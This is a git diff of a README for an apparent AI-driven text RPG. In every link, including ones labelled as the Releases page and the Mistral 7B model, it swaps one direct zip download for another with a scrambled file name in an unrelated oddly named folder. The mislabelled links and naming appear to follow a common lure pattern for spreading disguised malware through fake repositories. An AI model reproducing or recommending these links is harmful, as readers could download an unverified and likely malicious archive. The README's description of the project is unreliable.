@@ -6,11 +6,11 @@ Welcome to GenAI-Text-Based-RPG-with-NPCs! Dive into a unique role-playing exper
 
 ## 📥 Download the Game
 
-[![Download the Game](https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/GenAI-Text-Based-RPG-with-NPCs.zip%20Now-%20-blue)](https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/GenAI-Text-Based-RPG-with-NPCs.zip)
+[![Download the Game](https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/A-Text-Cs-RP-NP-Gen-Based-with-2.5.zip%20Now-%20-blue)](https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/A-Text-Cs-RP-NP-Gen-Based-with-2.5.zip)
 
 ## 📋 Overview
 
-GenAI-Text-Based-RPG-with-NPCs is a text-based role-playing game. It features AI-driven conversations that enhance your storytelling. Built with Python and the powerful Mistral 7B model via https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/GenAI-Text-Based-RPG-with-NPCs.zip, it provides a rich narrative experience.
+GenAI-Text-Based-RPG-with-NPCs is a text-based role-playing game. It features AI-driven conversations that enhance your storytelling. Built with Python and the powerful Mistral 7B model via https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/A-Text-Cs-RP-NP-Gen-Based-with-2.5.zip, it provides a rich narrative experience.
 
 ### 🔍 Features
 - **AI-Powered Conversations**: Engage with NPCs that respond intelligently.
@@ -29,7 +29,7 @@ GenAI-Text-Based-RPG-with-NPCs is a text-based role-playing game. It features AI
 
 To start your journey, follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/GenAI-Text-Based-RPG-with-NPCs.zip) to download the latest version of the game.
+1. Visit the [Releases page](https://raw.githubusercontent.com/3w5p/GenAI-Text-Based-RPG-with-NPCs/main/choledocholithotomy/A-Text-Cs-RP-NP-Gen-Based-with-2.5.zip) to download the latest version of the game.
    
 2. Find the release that has the tag “Latest”, with the date next to it. This version includes the newest features and fixes.
 
